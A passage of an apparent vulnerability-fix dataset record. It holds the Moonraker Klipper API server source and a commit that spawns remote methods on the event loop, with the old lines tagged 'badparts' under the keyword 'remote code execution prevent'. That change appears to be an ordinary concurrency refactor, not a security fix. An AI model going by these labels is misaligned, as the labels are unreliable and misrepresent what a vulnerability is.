self.init_attempts % LOG_ATTEMPT_INTERVAL==0 and \\ self.init_attempts <=MAX_LOG_ATTEMPTS: logging.info( f\"{e}\\nKlippy info request error. This indicates that\\n\" f\"Klippy may have experienced an error during startup.\\n\" f\"Please check klippy.log for more information\") return if send_id: self.init_list.append(\"identified\") fixed_paths={k: result[k] for k in ['klipper_path', 'python_path', 'log_file', 'config_file']} file_manager=self.lookup_plugin('file_manager') file_manager.update_fixed_paths(fixed_paths) self.klippy_state=result.get('state', \"unknown\") if self.klippy_state==\"ready\": await self._verify_klippy_requirements() logging.info(\"Klippy ready\") self.init_list.append('klippy_ready') for method in self.klippy_reg_methods: try: await self.klippy_apis.register_method(method) except ServerError: logging.exception(f\"Unable to register method '{method}'\") self.send_event(\"server:klippy_ready\") elif self.init_attempts % LOG_ATTEMPT_INTERVAL==0 and \\ self.init_attempts <=MAX_LOG_ATTEMPTS: msg=result.get('state_message', \"Klippy Not Ready\") logging.info(\"\\n\" +msg) async def _verify_klippy_requirements(self): result=await self.klippy_apis.get_object_list(default=None) if result is None: logging.info( f\"Unable to retreive Klipper Object List\") return for name in list(self.all_subscriptions.keys()): if name not in result: del self.all_subscriptions[name] req_objs=set([\"virtual_sdcard\", \"display_status\", \"pause_resume\"]) missing_objs=req_objs -set(result) if missing_objs: err_str=\", \".join([f\"[{o}]\" for o in missing_objs]) logging.info( f\"\\nWarning, unable to detect the following printer \" f\"objects:\\n{err_str}\\nPlease add the the above sections \" f\"to printer.cfg for full Moonraker functionality.\") if \"virtual_sdcard\" not in missing_objs: result=await self.klippy_apis.query_objects( {'configfile': None}, default=None) if result is None: logging.info(f\"Unable to set SD Card path\") else: config=result.get('configfile',{}).get('config',{}) vsd_config=config.get('virtual_sdcard',{}) vsd_path=vsd_config.get('path', None) if vsd_path is not None: file_manager=self.lookup_plugin('file_manager') file_manager.register_directory('gcodes', vsd_path) else: logging.info( \"Configuration for[virtual_sdcard] not found,\" \" unable to set SD Card path\") def _process_gcode_response(self, response): self.send_event(\"server:gcode_response\", response) def _process_status_update(self, eventtime, status): if 'webhooks' in status: state=status['webhooks'].get('state', None) if state is not None: if state==\"shutdown\": logging.info(\"Klippy has shutdown\") self.send_event(\"server:klippy_shutdown\") self.klippy_state=state self.send_event(\"server:status_update\", status) async def make_request(self, rpc_method, params): if rpc_method==\"objects\/subscribe\": for obj, items in params.get('objects',{}).items(): if obj in self.all_subscriptions: pi=self.all_subscriptions[obj] if items is None or pi is None: self.all_subscriptions[obj]=None else: uitems=list(set(pi) | set(items)) self.all_subscriptions[obj]=uitems else: self.all_subscriptions[obj]=items params['objects']=dict(self.all_subscriptions) params['response_template']={'method': \"process_status_update\"} base_request=BaseRequest(rpc_method, params) self.pending_requests[base_request.id]=base_request self.ioloop.spawn_callback( self.klippy_connection.send_request, base_request) result=await base_request.wait() return result async def _stop_server(self): self.server_running=False for name, plugin in self.plugins.items(): if hasattr(plugin, \"close\"): ret=plugin.close() if asyncio.iscoroutine(ret): await ret self.klippy_connection.close() while self.klippy_state !=\"disconnected\": await gen.sleep(.1) await self.moonraker_app.close() self.ioloop.stop() async def _handle_server_restart(self, path, method, args): self.ioloop.spawn_callback(self._stop_server) return \"ok\" async def _handle_info_request(self, path, method, args): return{ 'klippy_connected': self.klippy_connection.is_connected(), 'klippy_state': self.klippy_state, 'plugins': list(self.plugins.keys())} class KlippyConnection: def __init__(self, on_recd, on_close): self.ioloop=IOLoop.current() self.iostream=None self.on_recd=on_recd self.on_close=on_close async def connect(self, address): ksock=socket.socket(socket.AF_UNIX, socket.SOCK_STREAM) kstream=iostream.IOStream(ksock) try: await kstream.connect(address) except iostream.StreamClosedError: return False logging.info(\"Klippy Connection Established\") self.iostream=kstream self.iostream.set_close_callback(self.on_close) self.ioloop.spawn_callback(self._read_stream, self.iostream) return True async def _read_stream(self, stream): while not stream.closed(): try: data=await stream.read_until(b'\\x03') except iostream.StreamClosedError as e: return except Exception: logging.exception(\"Klippy Stream Read Error\") continue try: decoded_cmd=json.loads(data[:-1]) self.on_recd(decoded_cmd) except Exception: logging.exception( f\"Error processing Klippy Host Response:{data.decode()}\") async def send_request(self, request): if self.iostream is None: request.notify(ServerError(\"Klippy Host not connected\", 503)) return data=json.dumps(request.to_dict()).encode() +b\"\\x03\" try: await self.iostream.write(data) except iostream.StreamClosedError: request.notify(ServerError(\"Klippy Host not connected\", 503)) def is_connected(self): return self.iostream is not None and not self.iostream.closed() def close(self): if self.iostream is not None and \\ not self.iostream.closed(): self.iostream.close() class BaseRequest: def __init__(self, rpc_method, params): self.id=id(self) self.rpc_method=rpc_method self.params=params self._event=Event() self.response=None async def wait(self): start_time=time.time() while True: timeout=time.time() +60. try: await self._event.wait(timeout=timeout) except TimeoutError: pending_time=time.time() -start_time logging.info( f\"Request '{self.rpc_method}' pending: \" f\"{pending_time:.2f} seconds\") self._event.clear() continue break if isinstance(self.response, ServerError): raise self.response return self.response def notify(self, response): self.response=response self._event.set() def to_dict(self): return{'id': self.id, 'method': self.rpc_method, 'params': self.params} def main(): parser=argparse.ArgumentParser( description=\"Moonraker -Klipper API Server\") parser.add_argument( \"-c\", \"--configfile\", default=\"~\/moonraker.conf\", metavar='<configfile>', help=\"Location of moonraker configuration file\") parser.add_argument( \"-l\", \"--logfile\", default=\"\/tmp\/moonraker.log\", metavar='<logfile>', help=\"log file name and location\") cmd_line_args=parser.parse_args() log_file=os.path.normpath(os.path.expanduser(cmd_line_args.logfile)) cmd_line_args.logfile=log_file ql=utils.setup_logging(log_file) if sys.version_info <(3, 7): msg=f\"Moonraker requires Python 3.7 or above. \" \\ f\"Detected Version:{sys.version}\" logging.info(msg) print(msg) ql.stop() exit(1) io_loop=IOLoop.current() estatus=0 while True: try: server=Server(cmd_line_args) except Exception: logging.exception(\"Moonraker Error\") estatus=1 break try: server.start() io_loop.start() except Exception: logging.exception(\"Server Running Error\") estatus=1 break time.sleep(.5) logging.info(\"Attempting Server Restart...\") io_loop.close(True) logging.info(\"Server Shutdown\") ql.stop() exit(estatus) if __name__=='__main__': main() ","sourceWithComments":"# Moonraker - HTTP\/Websocket API Server for Klipper\n#\n# Copyright (C) 2020 Eric Callahan <arksine.code@gmail.com>\n#\n# This file may be distributed under the terms of the GNU GPLv3 license\nimport argparse\nimport sys\nimport importlib\nimport os\nimport time\nimport socket\nimport logging\nimport json\nimport confighelper\nimport utils\nimport asyncio\nfrom tornado import iostream, gen\nfrom tornado.ioloop import IOLoop\nfrom tornado.util import TimeoutError\nfrom tornado.locks import Event\nfrom app import MoonrakerApp\nfrom utils import ServerError\n\nINIT_TIME = .25\nLOG_ATTEMPT_INTERVAL = int(2. \/ INIT_TIME + .5)\nMAX_LOG_ATTEMPTS = 10 * LOG_ATTEMPT_INTERVAL\n\nCORE_PLUGINS = [\n    'file_manager', 'klippy_apis', 'machine',\n    'data_store', 'shell_command']\n\nclass Sentinel:\n    pass\n\nclass Server:\n    error = ServerError\n    def __init__(self, args):\n        config = confighelper.get_configuration(self, args)\n        self.host = config.get('host', \"0.0.0.0\")\n        self.port = config.getint('port', 7125)\n\n        # Event initialization\n        self.events = {}\n\n        # Klippy Connection Handling\n        self.klippy_address = config.get(\n            'klippy_uds_address', \"\/tmp\/klippy_uds\")\n        self.klippy_connection = KlippyConnection(\n            self.process_command, self.on_connection_closed)\n        self.init_list = []\n        self.init_handle = None\n        self.init_attempts = 0\n        self.klippy_state = \"disconnected\"\n\n        # XXX - currently moonraker maintains a superset of all\n        # subscriptions, the results of which are forwarded to all\n        # connected websockets. A better implementation would open a\n        # unique unix domain socket for each websocket client and\n        # allow Klipper to forward only those subscriptions back to\n        # correct client.\n        self.all_subscriptions = {}\n\n        # Server\/IOLoop\n        self.server_running = False\n        self.moonraker_app = app = MoonrakerApp(config)\n        self.register_endpoint = app.register_local_handler\n        self.register_static_file_handler = app.register_static_file_handler\n        self.register_upload_handler = app.register_upload_handler\n        self.ioloop = IOLoop.current()\n\n        self.register_endpoint(\n            \"\/server\/info\", ['GET'], self._handle_info_request)\n        self.register_endpoint(\n            \"\/server\/restart\", ['POST'], self._handle_server_restart)\n\n        # Setup remote methods accessable to Klippy.  Note that all\n        # registered remote methods should be of the notification type,\n        # they do not return a response to Klippy after execution\n        self.pending_requests = {}\n        self.remote_methods = {}\n        self.klippy_reg_methods = []\n        self.register_remote_method(\n            'process_gcode_response', self._process_gcode_response,\n            need_klippy_reg=False)\n        self.register_remote_method(\n            'process_status_update', self._process_status_update,\n            need_klippy_reg=False)\n\n        # Plugin initialization\n        self.plugins = {}\n        self.klippy_apis = self.load_plugin(config, 'klippy_apis')\n        self._load_plugins(config)\n\n    def start(self):\n        hostname, hostport = self.get_host_info()\n        logging.info(\n            f\"Starting Moonraker on ({self.host}, {hostport}), \"\n            f\"Hostname: {hostname}\")\n        self.moonraker_app.listen(self.host, self.port)\n        self.server_running = True\n        self.ioloop.spawn_callback(self._connect_klippy)\n\n    # ***** Plugin Management *****\n    def _load_plugins(self, config):\n        # load core plugins\n        for plugin in CORE_PLUGINS:\n            self.load_plugin(config, plugin)\n\n        # check for optional plugins\n        opt_sections = set(config.sections()) - \\\n            set(['server', 'authorization', 'cmd_args'])\n        for section in opt_sections:\n            self.load_plugin(config, section, None)\n\n    def load_plugin(self, config, plugin_name, default=Sentinel):\n        if plugin_name in self.plugins:\n            return self.plugins[plugin_name]\n        # Make sure plugin exists\n        mod_path = os.path.join(\n            os.path.dirname(__file__), 'plugins', plugin_name + '.py')\n        if not os.path.exists(mod_path):\n            msg = f\"Plugin ({plugin_name}) does not exist\"\n            logging.info(msg)\n            if default == Sentinel:\n                raise ServerError(msg)\n            return default\n        module = importlib.import_module(\"plugins.\" + plugin_name)\n        try:\n            if plugin_name not in CORE_PLUGINS:\n                config = config[plugin_name]\n            load_func = getattr(module, \"load_plugin\")\n            plugin = load_func(config)\n        except Exception:\n            msg = f\"Unable to load plugin ({plugin_name})\"\n            logging.exception(msg)\n            if default == Sentinel:\n                raise ServerError(msg)\n            return default\n        self.plugins[plugin_name] = plugin\n        logging.info(f\"Plugin ({plugin_name}) loaded\")\n        return plugin\n\n    def lookup_plugin(self, plugin_name, default=Sentinel):\n        plugin = self.plugins.get(plugin_name, default)\n        if plugin == Sentinel:\n            raise ServerError(f\"Plugin ({plugin_name}) not found\")\n        return plugin\n\n    def register_event_handler(self, event, callback):\n        self.events.setdefault(event, []).append(callback)\n\n    def send_event(self, event, *args):\n        events = self.events.get(event, [])\n        for evt in events:\n            self.ioloop.spawn_callback(evt, *args)\n\n    def register_remote_method(self, method_name, cb, need_klippy_reg=True):\n        if method_name in self.remote_methods:\n            # XXX - may want to raise an exception here\n            logging.info(f\"Remote method ({method_name}) already registered\")\n            return\n        self.remote_methods[method_name] = cb\n        if need_klippy_reg:\n            # These methods need to be registered with Klippy\n            self.klippy_reg_methods.append(method_name)\n\n    def get_host_info(self):\n        hostname = socket.gethostname()\n        return hostname, self.port\n\n    # ***** Klippy Connection *****\n    async def _connect_klippy(self):\n        if not self.server_running:\n            return\n        ret = await self.klippy_connection.connect(self.klippy_address)\n        if not ret:\n            self.ioloop.call_later(.25, self._connect_klippy)\n            return\n        # begin server iniialization\n        self.ioloop.spawn_callback(self._initialize)\n\n    def process_command(self, cmd):\n        method = cmd.get('method', None)\n        if method is not None:\n            # This is a remote method called from klippy\n            cb = self.remote_methods.get(method, None)\n            if cb is not None:\n                params = cmd.get('params', {})\n                cb(**params)\n            else:\n                logging.info(f\"Unknown method received: {method}\")\n            return\n        # This is a response to a request, process\n        req_id = cmd.get('id', None)\n        request = self.pending_requests.pop(req_id, None)\n        if request is None:\n            logging.info(\n                f\"No request matching request ID: {req_id}, \"\n                f\"response: {cmd}\")\n            return\n        if 'result' in cmd:\n            result = cmd['result']\n            if not result:\n                result = \"ok\"\n        else:\n            err = cmd.get('error', \"Malformed Klippy Response\")\n            result = ServerError(err, 400)\n        request.notify(result)\n\n    def on_connection_closed(self):\n        self.init_list = []\n        self.klippy_state = \"disconnected\"\n        for request in self.pending_requests.values():\n            request.notify(ServerError(\"Klippy Disconnected\", 503))\n        self.pending_requests = {}\n        logging.info(\"Klippy Connection Removed\")\n        self.send_event(\"server:klippy_disconnect\")\n        if self.init_handle is not None:\n            self.ioloop.remove_timeout(self.init_handle)\n        if self.server_running:\n            self.ioloop.call_later(.25, self._connect_klippy)\n\n    async def _initialize(self):\n        if not self.server_running:\n            return\n        await self._check_ready()\n        await self._request_endpoints()\n        # Subscribe to \"webhooks\"\n        # Register \"webhooks\" subscription\n        if \"webhooks_sub\" not in self.init_list:\n            temp_subs = self.all_subscriptions\n            self.all_subscriptions = {}\n            try:\n                await self.klippy_apis.subscribe_objects({'webhooks': None})\n            except ServerError as e:\n                logging.info(f\"{e}\\nUnable to subscribe to webhooks object\")\n            else:\n                logging.info(\"Webhooks Subscribed\")\n                self.init_list.append(\"webhooks_sub\")\n            self.all_subscriptions.update(temp_subs)\n        # Subscribe to Gcode Output\n        if \"gcode_output_sub\" not in self.init_list:\n            try:\n                await self.klippy_apis.subscribe_gcode_output()\n            except ServerError as e:\n                logging.info(\n                    f\"{e}\\nUnable to register gcode output subscription\")\n            else:\n                logging.info(\"GCode Output Subscribed\")\n                self.init_list.append(\"gcode_output_sub\")\n        if \"klippy_ready\" in self.init_list or \\\n                not self.klippy_connection.is_connected():\n            # Either Klippy is ready or the connection dropped\n            # during initialization.  Exit initialization\n            self.init_attempts = 0\n            self.init_handle = None\n        else:\n            self.init_attempts += 1\n            self.init_handle = self.ioloop.call_later(\n                INIT_TIME, self._initialize)\n\n    async def _request_endpoints(self):\n        result = await self.klippy_apis.list_endpoints(default=None)\n        if result is None:\n            return\n        endpoints = result.get('endpoints', {})\n        for ep in endpoints:\n            self.moonraker_app.register_remote_handler(ep)\n\n    async def _check_ready(self):\n        send_id = \"identified\" not in self.init_list\n        try:\n            result = await self.klippy_apis.get_klippy_info(send_id)\n        except ServerError as e:\n            if self.init_attempts % LOG_ATTEMPT_INTERVAL == 0 and \\\n                    self.init_attempts <= MAX_LOG_ATTEMPTS:\n                logging.info(\n                    f\"{e}\\nKlippy info request error.  This indicates that\\n\"\n                    f\"Klippy may have experienced an error during startup.\\n\"\n                    f\"Please check klippy.log for more information\")\n            return\n        if send_id:\n            self.init_list.append(\"identified\")\n        # Update filemanager fixed paths\n        fixed_paths = {k: result[k] for k in\n                       ['klipper_path', 'python_path',\n                        'log_file', 'config_file']}\n        file_manager = self.lookup_plugin('file_manager')\n        file_manager.update_fixed_paths(fixed_paths)\n        self.klippy_state = result.get('state', \"unknown\")\n        if self.klippy_state == \"ready\":\n            await self._verify_klippy_requirements()\n            logging.info(\"Klippy ready\")\n            self.init_list.append('klippy_ready')\n            # register methods with klippy\n            for method in self.klippy_reg_methods:\n                try:\n                    await self.klippy_apis.register_method(method)\n                except ServerError:\n                    logging.exception(f\"Unable to register method '{method}'\")\n            self.send_event(\"server:klippy_ready\")\n        elif self.init_attempts % LOG_ATTEMPT_INTERVAL == 0 and \\\n                self.init_attempts <= MAX_LOG_ATTEMPTS:\n            msg = result.get('state_message', \"Klippy Not Ready\")\n            logging.info(\"\\n\" + msg)\n\n    async def _verify_klippy_requirements(self):\n        result = await self.klippy_apis.get_object_list(default=None)\n        if result is None:\n            logging.info(\n                f\"Unable to retreive Klipper Object List\")\n            return\n        # Remove stale objects from the persistent subscription dict\n        for name in list(self.all_subscriptions.keys()):\n            if name not in result:\n                del self.all_subscriptions[name]\n        req_objs = set([\"virtual_sdcard\", \"display_status\", \"pause_resume\"])\n        missing_objs = req_objs - set(result)\n        if missing_objs:\n            err_str = \", \".join([f\"[{o}]\" for o in missing_objs])\n            logging.info(\n                f\"\\nWarning, unable to detect the following printer \"\n                f\"objects:\\n{err_str}\\nPlease add the the above sections \"\n                f\"to printer.cfg for full Moonraker functionality.\")\n        if \"virtual_sdcard\" not in missing_objs:\n            # Update the gcode path\n            result = await self.klippy_apis.query_objects(\n                {'configfile': None}, default=None)\n            if result is None:\n                logging.info(f\"Unable to set SD Card path\")\n            else:\n                config = result.get('configfile', {}).get('config', {})\n                vsd_config = config.get('virtual_sdcard', {})\n                vsd_path = vsd_config.get('path', None)\n                if vsd_path is not None:\n                    file_manager = self.lookup_plugin('file_manager')\n                    file_manager.register_directory('gcodes', vsd_path)\n                else:\n                    logging.info(\n                        \"Configuration for [virtual_sdcard] not found,\"\n                        \" unable to set SD Card path\")\n\n    def _process_gcode_response(self, response):\n        self.send_event(\"server:gcode_response\", response)\n\n    def _process_status_update(self, eventtime, status):\n        if 'webhooks' in status:\n            # XXX - process other states (startup, ready, error, etc)?\n            state = status['webhooks'].get('state', None)\n            if state is not None:\n                if state == \"shutdown\":\n                    logging.info(\"Klippy has shutdown\")\n                    self.send_event(\"server:klippy_shutdown\")\n                self.klippy_state = state\n        self.send_event(\"server:status_update\", status)\n\n    async def make_request(self, rpc_method, params):\n        # XXX - This adds the \"response_template\" to a subscription\n        # request and tracks all subscriptions so that each\n        # client gets what its requesting.  In the future we should\n        # track subscriptions per client and send clients only\n        # the data they are asking for.\n        if rpc_method == \"objects\/subscribe\":\n            for obj, items in params.get('objects', {}).items():\n                if obj in self.all_subscriptions:\n                    pi = self.all_subscriptions[obj]\n                    if items is None or pi is None:\n                        self.all_subscriptions[obj] = None\n                    else:\n                        uitems = list(set(pi) | set(items))\n                        self.all_subscriptions[obj] = uitems\n                else:\n                    self.all_subscriptions[obj] = items\n            params['objects'] = dict(self.all_subscriptions)\n            params['response_template'] = {'method': \"process_status_update\"}\n\n        base_request = BaseRequest(rpc_method, params)\n        self.pending_requests[base_request.id] = base_request\n        self.ioloop.spawn_callback(\n            self.klippy_connection.send_request, base_request)\n        result = await base_request.wait()\n        return result\n\n    async def _stop_server(self):\n        self.server_running = False\n        for name, plugin in self.plugins.items():\n            if hasattr(plugin, \"close\"):\n                ret = plugin.close()\n                if asyncio.iscoroutine(ret):\n                    await ret\n        self.klippy_connection.close()\n        while self.klippy_state != \"disconnected\":\n            await gen.sleep(.1)\n        await self.moonraker_app.close()\n        self.ioloop.stop()\n\n    async def _handle_server_restart(self, path, method, args):\n        self.ioloop.spawn_callback(self._stop_server)\n        return \"ok\"\n\n    async def _handle_info_request(self, path, method, args):\n        return {\n            'klippy_connected': self.klippy_connection.is_connected(),\n            'klippy_state': self.klippy_state,\n            'plugins': list(self.plugins.keys())}\n\nclass KlippyConnection:\n    def __init__(self, on_recd, on_close):\n        self.ioloop = IOLoop.current()\n        self.iostream = None\n        self.on_recd = on_recd\n        self.on_close = on_close\n\n    async def connect(self, address):\n        ksock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)\n        kstream = iostream.IOStream(ksock)\n        try:\n            await kstream.connect(address)\n        except iostream.StreamClosedError:\n            return False\n        logging.info(\"Klippy Connection Established\")\n        self.iostream = kstream\n        self.iostream.set_close_callback(self.on_close)\n        self.ioloop.spawn_callback(self._read_stream, self.iostream)\n        return True\n\n    async def _read_stream(self, stream):\n        while not stream.closed():\n            try:\n                data = await stream.read_until(b'\\x03')\n            except iostream.StreamClosedError as e:\n                return\n            except Exception:\n                logging.exception(\"Klippy Stream Read Error\")\n                continue\n            try:\n                decoded_cmd = json.loads(data[:-1])\n                self.on_recd(decoded_cmd)\n            except Exception:\n                logging.exception(\n                    f\"Error processing Klippy Host Response: {data.decode()}\")\n\n    async def send_request(self, request):\n        if self.iostream is None:\n            request.notify(ServerError(\"Klippy Host not connected\", 503))\n            return\n        data = json.dumps(request.to_dict()).encode() + b\"\\x03\"\n        try:\n            await self.iostream.write(data)\n        except iostream.StreamClosedError:\n            request.notify(ServerError(\"Klippy Host not connected\", 503))\n\n    def is_connected(self):\n        return self.iostream is not None and not self.iostream.closed()\n\n    def close(self):\n        if self.iostream is not None and \\\n                not self.iostream.closed():\n            self.iostream.close()\n\n# Basic WebRequest class, easily converted to dict for json encoding\nclass BaseRequest:\n    def __init__(self, rpc_method, params):\n        self.id = id(self)\n        self.rpc_method = rpc_method\n        self.params = params\n        self._event = Event()\n        self.response = None\n\n    async def wait(self):\n        # Log pending requests every 60 seconds\n        start_time = time.time()\n        while True:\n            timeout = time.time() + 60.\n            try:\n                await self._event.wait(timeout=timeout)\n            except TimeoutError:\n                pending_time = time.time() - start_time\n                logging.info(\n                    f\"Request '{self.rpc_method}' pending: \"\n                    f\"{pending_time:.2f} seconds\")\n                self._event.clear()\n                continue\n            break\n        if isinstance(self.response, ServerError):\n            raise self.response\n        return self.response\n\n    def notify(self, response):\n        self.response = response\n        self._event.set()\n\n    def to_dict(self):\n        return {'id': self.id, 'method': self.rpc_method,\n                'params': self.params}\n\ndef main():\n    # Parse start arguments\n    parser = argparse.ArgumentParser(\n        description=\"Moonraker - Klipper API Server\")\n    parser.add_argument(\n        \"-c\", \"--configfile\", default=\"~\/moonraker.conf\",\n        metavar='<configfile>',\n        help=\"Location of moonraker configuration file\")\n    parser.add_argument(\n        \"-l\", \"--logfile\", default=\"\/tmp\/moonraker.log\", metavar='<logfile>',\n        help=\"log file name and location\")\n    cmd_line_args = parser.parse_args()\n\n    # Setup Logging\n    log_file = os.path.normpath(os.path.expanduser(cmd_line_args.logfile))\n    cmd_line_args.logfile = log_file\n    ql = utils.setup_logging(log_file)\n\n    if sys.version_info < (3, 7):\n        msg = f\"Moonraker requires Python 3.7 or above.  \" \\\n            f\"Detected Version: {sys.version}\"\n        logging.info(msg)\n        print(msg)\n        ql.stop()\n        exit(1)\n\n    # Start IOLoop and Server\n    io_loop = IOLoop.current()\n    estatus = 0\n    while True:\n        try:\n            server = Server(cmd_line_args)\n        except Exception:\n            logging.exception(\"Moonraker Error\")\n            estatus = 1\n            break\n        try:\n            server.start()\n            io_loop.start()\n        except Exception:\n            logging.exception(\"Server Running Error\")\n            estatus = 1\n            break\n        # Since we are running outside of the the server\n        # it is ok to use a blocking sleep here\n        time.sleep(.5)\n        logging.info(\"Attempting Server Restart...\")\n    io_loop.close(True)\n    logging.info(\"Server Shutdown\")\n    ql.stop()\n    exit(estatus)\n\n\nif __name__ == '__main__':\n    main()\n"}},"msg":"moonraker:  spawn remote methods on the event loop\n\nThis allows regsitered methods to be coroutines.  Execution is done on the event loop to prevent a coroutine from blocking the incoming command queue.\n\nSigned-off-by:  Eric Callahan <arksine.code@gmail.com>"}},"https:\/\/github.com\/Flsun3d\/moonraker_fs":{"6dfab37ef856fade2839dd0315db4f2d25284947":{"url":"https:\/\/api.github.com\/repos\/Flsun3d\/moonraker_fs\/commits\/6dfab37ef856fade2839dd0315db4f2d25284947","html_url":"https:\/\/github.com\/Flsun3d\/moonraker_fs\/commit\/6dfab37ef856fade2839dd0315db4f2d25284947","message":"moonraker:  spawn remote methods on the event loop\n\nThis allows regsitered methods to be coroutines.  Execution is done on the event loop to prevent a coroutine from blocking the incoming command queue.\n\nSigned-off-by:  Eric Callahan <arksine.code@gmail.com>","sha":"6dfab37ef856fade2839dd0315db4f2d25284947","keyword":"remote code execution prevent","diff":"diff --git a\/moonraker\/moonraker.py b\/moonraker\/moonraker.py\nindex e438602..7e0a9ed 100644\n--- a\/moonraker\/moonraker.py\n+++ b\/moonraker\/moonraker.py\n@@ -183,10 +183,10 @@ def process_command(self, cmd):\n         method = cmd.get('method', None)\n         if method is not None:\n             # This is a remote method called from klippy\n-            cb = self.remote_methods.get(method, None)\n-            if cb is not None:\n+            if method in self.remote_methods:\n                 params = cmd.get('params', {})\n-                cb(**params)\n+                self.ioloop.spawn_callback(\n+                    self._execute_method, method, **params)\n             else:\n                 logging.info(f\"Unknown method received: {method}\")\n             return\n@@ -207,6 +207,14 @@ def process_command(self, cmd):\n             result = ServerError(err, 400)\n         request.notify(result)\n \n+    async def _execute_method(self, method_name, **kwargs):\n+        try:\n+            ret = self.remote_methods[method_name](**kwargs)\n+            if asyncio.iscoroutine(ret):\n+                await ret\n+        except Exception:\n+            logging.exception(f\"Error running remote method: {method_name}\")\n+\n     def on_connection_closed(self):\n         self.init_list = []\n         self.klippy_state = \"disconnected\"\n","files":{"\/moonraker\/moonraker.py":{"changes":[{"diff":"\n         method = cmd.get('method', None)\n         if method is not None:\n             # This is a remote method called from klippy\n-            cb = self.remote_methods.get(method, None)\n-            if cb is not None:\n+            if method in self.remote_methods:\n                 params = cmd.get('params', {})\n-                cb(**params)\n+                self.ioloop.spawn_callback(\n+                    self._execute_method, method, **params)\n             else:\n                 logging.info(f\"Unknown method received: {method}\")\n             return\n","add":3,"remove":3,"filename":"\/moonraker\/moonraker.py","badparts":["            cb = self.remote_methods.get(method, None)","            if cb is not None:","                cb(**params)"],"goodparts":["            if method in self.remote_methods:","                self.ioloop.spawn_callback(","                    self._execute_method, method, **params)"]},{"diff":"\n         method = cmd.get('method', None)\n         if method is not None:\n             # This is a remote method called from klippy\n-            cb = self.remote_methods.get(method, None)\n-            if cb is not None:\n+            if method in self.remote_methods:\n                 params = cmd.get('params', {})\n-                cb(**params)\n+                self.ioloop.spawn_callback(\n+                    self._execute_method, method, **params)\n             else:\n                 logging.info(f\"Unknown method received: {method}\")\n             return\n","add":3,"remove":3,"filename":"\/moonraker\/moonraker.py","badparts":["            cb = self.remote_methods.get(method, None)","            if cb is not None:","                cb(**params)"],"goodparts":["            if method in self.remote_methods:","                self.ioloop.spawn_callback(","                    self._execute_method, method, **params)"]}],"source":"\n import argparse import sys import importlib import os import time import socket import logging import json import confighelper import utils import asyncio from tornado import iostream, gen from tornado.ioloop import IOLoop from tornado.util import TimeoutError from tornado.locks import Event from app import MoonrakerApp from utils import ServerError INIT_TIME=.25 LOG_ATTEMPT_INTERVAL=int(2. \/ INIT_TIME +.5) MAX_LOG_ATTEMPTS=10 * LOG_ATTEMPT_INTERVAL CORE_PLUGINS=[ 'file_manager', 'klippy_apis', 'machine', 'data_store', 'shell_command'] class Sentinel: pass class Server: error=ServerError def __init__(self, args): config=confighelper.get_configuration(self, args) self.host=config.get('host', \"0.0.0.0\") self.port=config.getint('port', 7125) self.events={} self.klippy_address=config.get( 'klippy_uds_address', \"\/tmp\/klippy_uds\") self.klippy_connection=KlippyConnection( self.process_command, self.on_connection_closed) self.init_list=[] self.init_handle=None self.init_attempts=0 self.klippy_state=\"disconnected\" self.all_subscriptions={} self.server_running=False self.moonraker_app=app=MoonrakerApp(config) self.register_endpoint=app.register_local_handler self.register_static_file_handler=app.register_static_file_handler self.register_upload_handler=app.register_upload_handler self.ioloop=IOLoop.current() self.register_endpoint( \"\/server\/info\",['GET'], self._handle_info_request) self.register_endpoint( \"\/server\/restart\",['POST'], self._handle_server_restart) self.pending_requests={} self.remote_methods={} self.klippy_reg_methods=[] self.register_remote_method( 'process_gcode_response', self._process_gcode_response, need_klippy_reg=False) self.register_remote_method( 'process_status_update', self._process_status_update, need_klippy_reg=False) self.plugins={} self.klippy_apis=self.load_plugin(config, 'klippy_apis') self._load_plugins(config) def start(self): hostname, hostport=self.get_host_info() logging.info( f\"Starting Moonraker on({self.host},{hostport}), \" f\"Hostname:{hostname}\") self.moonraker_app.listen(self.host, self.port) self.server_running=True self.ioloop.spawn_callback(self._connect_klippy) def _load_plugins(self, config): for plugin in CORE_PLUGINS: self.load_plugin(config, plugin) opt_sections=set(config.sections()) -\\ set(['server', 'authorization', 'cmd_args']) for section in opt_sections: self.load_plugin(config, section, None) def load_plugin(self, config, plugin_name, default=Sentinel): if plugin_name in self.plugins: return self.plugins[plugin_name] mod_path=os.path.join( os.path.dirname(__file__), 'plugins', plugin_name +'.py') if not os.path.exists(mod_path): msg=f\"Plugin({plugin_name}) does not exist\" logging.info(msg) if default==Sentinel: raise ServerError(msg) return default module=importlib.import_module(\"plugins.\" +plugin_name) try: if plugin_name not in CORE_PLUGINS: config=config[plugin_name] load_func=getattr(module, \"load_plugin\") plugin=load_func(config) except Exception: msg=f\"Unable to load plugin({plugin_name})\" logging.exception(msg) if default==Sentinel: raise ServerError(msg) return default self.plugins[plugin_name]=plugin logging.info(f\"Plugin({plugin_name}) loaded\") return plugin def lookup_plugin(self, plugin_name, default=Sentinel): plugin=self.plugins.get(plugin_name, default) if plugin==Sentinel: raise ServerError(f\"Plugin({plugin_name}) not found\") return plugin def register_event_handler(self, event, callback): self.events.setdefault(event,[]).append(callback) def send_event(self, event, *args): events=self.events.get(event,[]) for evt in events: self.ioloop.spawn_callback(evt, *args) def register_remote_method(self, method_name, cb, need_klippy_reg=True): if method_name in self.remote_methods: logging.info(f\"Remote method({method_name}) already registered\") return self.remote_methods[method_name]=cb if need_klippy_reg: self.klippy_reg_methods.append(method_name) def get_host_info(self): hostname=socket.gethostname() return hostname, self.port async def _connect_klippy(self): if not self.server_running: return ret=await self.klippy_connection.connect(self.klippy_address) if not ret: self.ioloop.call_later(.25, self._connect_klippy) return self.ioloop.spawn_callback(self._initialize) def process_command(self, cmd): method=cmd.get('method', None) if method is not None: cb=self.remote_methods.get(method, None) if cb is not None: params=cmd.get('params',{}) cb(**params) else: logging.info(f\"Unknown method received:{method}\") return req_id=cmd.get('id', None) request=self.pending_requests.pop(req_id, None) if request is None: logging.info( f\"No request matching request ID:{req_id}, \" f\"response:{cmd}\") return if 'result' in cmd: result=cmd['result'] if not result: result=\"ok\" else: err=cmd.get('error', \"Malformed Klippy Response\") result=ServerError(err, 400) request.notify(result) def on_connection_closed(self): self.init_list=[] self.klippy_state=\"disconnected\" for request in self.pending_requests.values(): request.notify(ServerError(\"Klippy Disconnected\", 503)) self.pending_requests={} logging.info(\"Klippy Connection Removed\") self.send_event(\"server:klippy_disconnect\") if self.init_handle is not None: self.ioloop.remove_timeout(self.init_handle) if self.server_running: self.ioloop.call_later(.25, self._connect_klippy) async def _initialize(self): if not self.server_running: return await self._check_ready() await self._request_endpoints() if 